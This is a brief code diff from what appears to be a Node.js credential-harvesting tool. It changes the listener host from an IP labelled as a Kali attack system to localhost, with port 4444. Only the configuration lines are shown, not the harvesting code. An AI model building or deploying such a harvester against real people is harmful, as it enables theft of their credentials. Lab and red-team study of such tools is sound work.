@@ -5,7 +5,7 @@ const fs = require('fs');
 const path = require('path');
 
 // Configuration
-const HOST = '192.168.217.139';  // Kali attack system IP
+const HOST = 'localhost';  // Connect to local server
 const PORT = 4444;
 
 class CredentialHarvester {
